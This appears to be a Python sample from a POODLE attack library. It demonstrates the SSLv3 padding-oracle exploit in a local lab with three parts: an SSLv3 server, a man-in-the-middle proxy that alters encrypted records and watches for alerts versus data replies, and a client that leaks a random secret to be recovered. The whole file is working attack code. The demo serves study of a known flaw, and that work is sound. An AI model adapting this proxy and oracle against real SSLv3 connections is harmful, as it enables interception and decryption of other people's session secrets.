""" This sample shows how to exploit the POODLE vulnerability.

"""

import sys
sys.path.append('../src')
from poodle import POODLE

import SocketServer
import ssl
import struct
import random
import string
import threading
import select
import socket

secret = ''.join([random.choice(string.printable) for c in range(25)])

class POODLE_Client(POODLE):

  def __init__(self):
    POODLE.__init__(self)
    return

  def trigger(self, prefix, suffix=''):
    s = socket.create_connection((MITM_HOST, MITM_PORT))
    s = ssl.wrap_socket(s, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3, cert_reqs=ssl.CERT_NONE, ciphers="SHA1+DES")

    self.message = None

    try:
      s.send('%s|secret=%s|%s' % (prefix, secret, suffix))
      s.recv(2)
    except ssl.SSLError as e:
      #print 'ssl error: %s' % str(e)
      pass

    s.close()
    return self.message

poodle = POODLE_Client()

class MitmTCPHandler(SocketServer.BaseRequestHandler):

  def handle(self):
    destination = socket.create_connection((SSL_HOST, SSL_PORT))

    just_altered = False
    running = True
    sockets = [self.request, destination]
    while running:
      inputready, outputready, exceptready = select.select(sockets,[],[])
      for s in inputready:
        if s == self.request:
          header = self.request.recv(5)
          if header == '':
            #print 'client disconnected'
            running = False
            break
          (content_type, version, length) = struct.unpack('>BHH', header)
          data = self.request.recv(length)
          if content_type == 23 and length > 24: # application data
            data = poodle.message_callback(data)
            just_altered = True

            #print 'client->server (%u): %s' % (length, repr(data), )

          destination.send(header+data)
        elif s == destination:
          data = destination.recv(1024)
          if data == '':
            #print 'server disconnected'
            running = False
            if just_altered:
              poodle.mark_error()
            break
          if just_altered:
            (content_type, version, length) = struct.unpack('>BHH', data[:5])
            if content_type == 23: # app data
              # server response message: decryption worked!
              poodle.mark_success()
            if content_type == 21: # alert
              # bad mac alert
              poodle.mark_error()
            just_altered = False
          #print 'server->client: %s' % (repr(data), )
          self.request.send(data)

    return

class SecureTCPHandler(SocketServer.BaseRequestHandler):
  def handle(self):
    self.request = ssl.wrap_socket(self.request, keyfile="cert.pem", certfile="cert.pem", server_side=True, ssl_version=ssl.PROTOCOL_SSLv3, cert_reqs=ssl.CERT_NONE, ciphers="SHA1+DES")
    while True:
      try:
        data = self.request.recv(1024)
        if data == '':
          break
        #print 'securely received: %s' % repr(data)
        self.request.send('ok')
      except ssl.SSLError as e:
        #print 'ssl error: %s' % str(e)
        break
    return

if __name__ == "__main__":
  SSL_HOST, SSL_PORT = "0.0.0.0", 30001
  MITM_HOST, MITM_PORT = "0.0.0.0", 30002

  print('THE SECRET IS %s' % repr(secret))

  SocketServer.TCPServer.allow_reuse_address = True

  secure_server = SocketServer.TCPServer((SSL_HOST, SSL_PORT), SecureTCPHandler)
  mitm_server = SocketServer.TCPServer((MITM_HOST, MITM_PORT), MitmTCPHandler)

  threads = [
    threading.Thread(target=secure_server.serve_forever),
    threading.Thread(target=mitm_server.serve_forever),
  ]

  for thread in threads:
    thread.start()

  poodle.run()
  print 'done'

  secure_server.shutdown()
  mitm_server.shutdown()

  #for thread in threads:
  #  thread.join()


